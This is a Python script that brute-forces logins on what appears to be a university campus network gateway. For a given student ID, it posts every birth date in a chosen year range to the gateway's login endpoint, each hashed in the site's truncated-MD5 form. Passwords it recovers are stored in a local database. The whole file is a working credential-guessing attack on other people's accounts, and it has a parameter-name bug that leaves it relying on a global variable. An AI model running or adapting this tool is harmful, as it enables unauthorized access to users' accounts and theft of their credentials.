#!/usr/bin/python3
################################################################################
#待解决问题，当密码错误时程序能够正常运行，但当用户名错误（位数不对时），程序会挂起。
import urllib.request
import hashlib
import urllib.parse
import shelve
import re

Month_Day=[31,29,31,30,31,30,31,31,30,31,30,31]

def get_password(old_pass):
    mpass=hashlib.md5()
    mpass.update(old_pass.encode("utf-8"))
    new_pass=mpass.hexdigest()
    new_pass=new_pass[8:24]
    return new_pass

def check_password(username,password):
    new_pass=get_password(password)
    formdata={
        'username':username,
        'password':new_pass,
        'drop':0,
        'type':1,
        'n':100}
    url="http://202.112.136.131/cgi-bin/do_login"
    user_agent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36'
    content_length=len(username)+55
    headers={'User-Agent':user_agent,
             'Content-Length':content_length,
             'Connection':'keep-alive',
             'Content-Type':"application/x-www-form-urlencoded",
    }
    formdata=urllib.parse.urlencode(formdata)
    formdata=formdata.encode("gbk")
    req=urllib.request.Request(url,headers=headers,data=formdata)
    myResponse=urllib.request.urlopen(req)
    backcode=myResponse.read()
    backcode=backcode.decode("gbk")
    return backcode

def getBirthday(year,mon,day):
    birthday=str(year)
    Mon=str(mon+1)
    if(len(Mon)<2):
        Mon='0'+Mon
    Day=str(day+1)
    if(len(Day)<2):
        Day='0'+Day
    birthday=birthday+Mon+Day
    return birthday

def getPassword(username,textpass):
    result=False
    if '-' in testpass:
        begyear=testpass.split('-')[0]
        endyear=testpass.split('-')[1]
        for i in range(int(begyear),int(endyear)+1):
            for j in range(12):
                for k in range(Month_Day[j]):
                    password=getBirthday(i,j,k)
                    print(password)
                    backcode=check_password(username,password)
                    if backcode=='password_error':
                        continue
                    else:
                        return " ".join([backcode,password])
    else:
        password=str(testpass)
        backcode=check_password(username,password)
        return ' '.join([backcode,password])
    return "wrong birthday guess"

if __name__=="__main__":
    buaadb=shelve.open("buaadb-shelve")
    username=input("请输入学号(字母小写):")
    testpass=input("请输入密码(若未知请输入年份区间 e.g. 1988-1989):")

    if username in buaadb:
        testpass=buaadb[username]
    password=getPassword(username,testpass)
    print("用户名:",end=' ')
    print(username)
    print("result:")
    message=password.split(' ')[0]
    password=password.split(' ')[-1]
    pat=re.compile('^[\d]+$')
    if pat.match(message):
        print('密码: '+password)
        print('登录成功')
        if username not in buaadb:
            buaadb[username]=password
    elif message=="ip_exist_error":
        print('Already login by another client')
        if username not in buaadb:
            buaadb[username]=password
    else:
        print('登录失败')
        print('error message',end=' ')
        print(message)
    buaadb.close()
